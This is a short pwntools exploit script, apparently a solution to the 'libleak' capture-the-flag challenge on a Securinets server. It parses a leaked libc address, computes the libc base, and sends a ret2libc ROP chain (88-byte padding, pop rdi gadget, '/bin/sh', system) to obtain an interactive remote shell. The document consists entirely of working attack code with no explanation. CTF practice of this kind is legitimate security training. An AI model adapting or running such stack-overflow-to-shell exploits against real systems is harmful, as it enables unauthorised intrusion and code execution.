from pwn import *

elf = context.binary = ELF('./libleak', False)
libc = ELF('./libc.so.6')

ret        = pack(0x00000000004012a9)
pop_rdi    = pack(0x0000000000401313)

offset = 88

p = remote('pwn.ctf.securinets.tn', 8999)

p.recvuntil(b'?\n')
p.recvuntil(b'?\n')

leak         = int(p.recvline(False), 16)
libc.address = leak - libc.symbols.sleep

bin_sh     = pack(next(libc.search(b'/bin/sh\x00')))
system     = pack(libc.symbols.system)

payload  = b'A' * offset
payload += pop_rdi
payload += bin_sh
payload += ret
payload += system

pause()
p.sendline(payload)

p.interactive()
